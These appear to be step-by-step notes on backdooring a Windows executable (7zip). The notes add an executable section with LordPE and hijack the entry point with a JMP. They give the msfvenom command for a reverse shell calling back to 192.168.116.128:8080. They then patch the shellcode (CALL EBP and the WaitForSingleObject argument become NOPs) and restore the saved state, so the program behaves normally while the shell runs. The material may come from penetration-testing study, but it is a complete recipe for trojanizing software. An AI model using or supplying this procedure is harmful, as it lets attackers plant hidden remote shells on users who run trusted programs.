- Open Lord PE
- Go to section header 
- add the section header (added .hello) at the bottom.
- Add the Virtual size and Raw size 1000 bytes. Note that 1000 is in hexadecimal (4096 bytes decimal).
- Make the section header executable as we have to place our Shellcode in this section so it has to be executable, 
    writable and readable.
- Save the file as original.
- Use any hex editor to add 1000 hexademical bytes at the end of the file.
- Verify the steps above worked:
      + Can you run the file normally now? 
      + Is there a new section with proper size and permissions added?
            - Immunity --> Memory Section --> double click PE headers.
Hijack execution FLow
-  Note down the first 5 opcodes, as will need them later when restoring the execution flow back.
- Copy the setarting address of .hello section
- Open the program in Immuntiy and replace the first opcode (Entry point) with JMP <address to new section>
- Save
- Open program, jump to newly created section:

PUSHAD
PUSHFD
Shellcode....
POPAD
POPFD
Restore Execution Flow...


We generate windows stageless reverse shellcode using the following arguments in mfsvenom
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.116.128 LPORT=8080 -a x86 --platform windows -f hex
        
Modifying Shellcode:

- At the end of the shellcode we see an opcode CALL EBP which terminates the execution of the program after shellcode 
is executed, and we donâ€™t want the program execution to terminate, 
infact we want the program to function normally after the shellcode execution, 
for this reason we have to modify the opcode CALL EBP to NOP (no operation).

- Another modification that needs to be made is due to the presence of a WaitForSingleObject in our shellcode. 
WaitForSignleObject function takes an argument in milliseconds and wait till that time before starting other threads. 
If the WaitForSignleObject function argument is -1 this means that it will wait infinite amount of t
ime before starting other threads. 
Which simply means that if we execute the binary it will spawn a reverse shell but normal functionality of 7zip 
would halt till we close our reverse shell. 
This post helps in finding and fixing WaitForSignleObject. 
We simply need to modify opcode DEC INC whose value is -1 (Arugment for WaitForSignleObject) to NOP.

- Next we need to POP register values off the stack (to restore the stack value pre-shellcode) using POPFD and POPAD  
at the end of shellcode.

After POPFD and POPAD we need to add the 5 hijacked instructions
(copied earlier in hijack execution flow) back, to make sure after shellcode execution our 7zip program functions normally.

- Save
